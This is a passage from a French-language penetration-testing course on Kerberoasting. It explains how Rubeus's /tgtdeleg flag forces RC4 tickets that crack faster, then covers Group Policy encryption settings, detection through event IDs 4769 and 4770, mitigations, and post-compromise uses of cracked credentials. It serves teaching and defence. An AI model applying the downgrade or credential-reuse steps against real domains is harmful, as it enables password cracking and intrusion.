Nous pouvons utiliser Rubeus avec le `/tgtdeleg`drapeau pour spécifier que nous ne voulons que le cryptage RC4 lors de la demande d'un nouveau ticket de service. Pour ce faire, l'outil spécifie le chiffrement RC4 comme seul algorithme pris en charge dans le corps de la requête TGS. Il peut s'agir d'une sécurité intégrée à Active Directory pour une compatibilité descendante. En utilisant cet indicateur, nous pouvons demander un ticket crypté RC4 (type 23) qui peut être craqué beaucoup plus rapidement.

#### Utilisation de l'indicateur /tgtdeleg

![image](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)

Dans l'image ci-dessus, nous pouvons voir que lors de la fourniture de l' `/tgtdeleg`indicateur, l'outil a demandé un ticket RC4 même si les types de chiffrement pris en charge sont répertoriés comme AES 128/256. Cet exemple simple montre l'importance d'une énumération détaillée et de creuser plus profondément lors de l'exécution d'attaques telles que Kerberoasting. Ici, nous pourrions rétrograder d'AES à RC4 et réduire le temps de cracking de plus de 4 minutes et 30 secondes. Dans un engagement réel où nous avons à notre disposition une puissante plate-forme de craquage de mot de passe GPU, ce type de rétrogradation pourrait entraîner un craquage de hachage en quelques heures au lieu de quelques jours et pourrait faire et défaire notre évaluation.

Remarque : cela ne fonctionne pas avec un contrôleur de domaine Windows Server 2019, quel que soit le niveau fonctionnel du domaine. Il renverra toujours un ticket de service crypté avec le plus haut niveau de cryptage pris en charge par le compte cible. Cela étant dit, si nous nous trouvons dans un domaine avec des contrôleurs de domaine fonctionnant sur Server 2016 ou une version antérieure (ce qui est assez courant), l'activation d'AES n'atténuera pas partiellement le Kerberoasting en renvoyant uniquement les tickets chiffrés AES, qui sont beaucoup plus difficiles à craquer, mais permettra plutôt à un attaquant de demander un ticket de service chiffré RC4. Dans les DC Windows Server 2019, l'activation du chiffrement AES sur un compte SPN entraînera la réception d'un ticket de service AES-256 (type 18), ce qui est beaucoup plus difficile (mais pas impossible) à déchiffrer, surtout si un mot de passe de dictionnaire relativement faible est utilisé.

Il est possible de modifier les types de chiffrement utilisés par Kerberos. Cela peut être fait en ouvrant la stratégie de groupe, en modifiant la stratégie de domaine par défaut et en choisissant : `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, puis en double-cliquant sur `Network security: Configure encryption types allowed for Kerberos`et en sélectionnant le type de chiffrement souhaité autorisé pour Kerberos. La suppression de tous les autres types de chiffrement, à l'exception de, `RC4_HMAC_MD5`permettrait à l'exemple de rétrogradation ci-dessus de se produire en 2019. La suppression de la prise en charge d'AES introduirait une faille de sécurité dans AD et ne devrait probablement jamais être effectuée. De plus, la suppression de la prise en charge de RC4, quelle que soit la version du contrôleur de domaine Windows Server ou le niveau fonctionnel du domaine, peut avoir des impacts opérationnels et doit être soigneusement testée avant la mise en œuvre.

![image](https://academy.hackthebox.com/storage/modules/143/kerb_encrypt_types.png)

* * * * *

Atténuation et détection
------------------------

Une atténuation importante pour les comptes de service non gérés consiste à définir un mot de passe long et complexe ou une phrase secrète qui n'apparaît dans aucune liste de mots et qui prendrait beaucoup trop de temps à déchiffrer. Cependant, il est recommandé d'utiliser [des comptes de service gérés (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009) et [des comptes de service gérés de groupe (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) , qui utilisent des mots de passe très complexes et effectuent une rotation automatique sur un intervalle défini (comme les comptes de machine) ou des comptes configurés avec LAPS.

Kerberoasting demande des tickets TGS Kerberos avec chiffrement RC4, qui ne devrait pas représenter la majorité de l'activité Kerberos au sein d'un domaine. Lorsque Kerberoasting se produit dans l'environnement, nous verrons un nombre anormal de `TGS-REQ`demandes `TGS-REP`et de réponses, signalant l'utilisation d'outils automatisés de Kerberoasting. Les contrôleurs de domaine peuvent être configurés pour consigner les demandes de ticket TGS Kerberos en sélectionnant [Auditer les opérations de ticket de service Kerberos](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) dans la stratégie de groupe.

![image](https://academy.hackthebox.com/storage/modules/143/kerb_audit.png)

Cela générera deux ID d'événement distincts : [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769) : un ticket de service Kerberos a été demandé et [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770) : un ticket de service Kerberos a été renouvelé. 10-20 Les requêtes Kerberos TGS pour un compte donné peuvent être considérées comme normales dans un environnement donné. Une grande quantité de 4769 ID d'événement d'un compte sur une courte période peut indiquer une attaque.

Ci-dessous, nous pouvons voir un exemple d'attaque Kerberoasting enregistrée. Nous voyons de nombreux événements ID 4769 enregistrés successivement, ce qui semble être un comportement anormal. En cliquant sur l'un d'eux, nous pouvons voir qu'un ticket de service Kerberos a été demandé par l' `htb-student`utilisateur (attaquant) pour le `sqldev`compte (cible). Nous pouvons également voir que le type de chiffrement du ticket est `0x17`, qui est la valeur hexadécimale pour 23 ( `DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256`), ce qui signifie que le ticket demandé était RC4, donc si le mot de passe était faible, il y a de fortes chances que l'attaquant puisse le déchiffrer et prendre le contrôle du `sqldev`compte.

![image](https://academy.hackthebox.com/storage/modules/143/4769.png)

Certaines autres étapes de correction incluent la restriction de l'utilisation de l'algorithme RC4, en particulier pour les requêtes Kerberos par les comptes de service. Cela doit être testé pour s'assurer que rien ne se brise dans l'environnement. De plus, les administrateurs de domaine et autres comptes hautement privilégiés ne doivent pas être utilisés comme comptes SPN (si des comptes SPN doivent exister dans l'environnement).

Cet excellent [article](https://adsecurity.org/?p=3458) de Sean Metcalf met en évidence certaines stratégies d'atténuation et de détection du Kerberoasting.

* * * * *

Continuer
---------

Maintenant que nous avons un ensemble d'informations d'identification (espérons-le privilégiées), nous pouvons passer à voir où nous pouvons utiliser les informations d'identification. Nous pourrons peut-être :

-   Accéder à un hôte via RDP ou WinRM en tant qu'utilisateur local ou administrateur local
-   Authentifiez-vous auprès d'un hôte distant en tant qu'administrateur à l'aide d'un outil tel que PsExec
-   Accéder à un partage de fichiers sensible
-   Obtenez un accès MSSQL à un hôte en tant qu'utilisateur DBA, qui peut ensuite être exploité pour élever les privilèges

Indépendamment de notre accès, nous voudrons également creuser plus profondément dans le domaine pour d'autres défauts et erreurs de configuration qui peuvent nous aider à étendre notre accès et à ajouter à notre rapport pour offrir plus de valeur à nos clients.
